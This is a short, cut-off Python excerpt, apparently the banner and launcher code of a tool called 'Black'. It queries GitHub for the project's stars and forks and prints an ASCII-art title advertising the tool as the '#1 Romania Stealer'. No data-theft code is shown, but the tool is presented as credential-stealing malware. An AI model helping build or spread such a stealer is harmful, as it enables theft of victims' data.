...
def main():
    stars = requests.get(
        f"https://api.github.com/repos/pateu198/Black").json()["stargazers_count"]
    forks = requests.get(
        f"https://api.github.com/repos/pateu198/Black").json()["forks_count"]
    ...
    console.print(pyfiglet.figlet_format("Black", font="graffiti"),
                  justify="center", highlight=False, style="magenta", overflow="ignore")
    console.print(f"#1 Romania Stealer.",
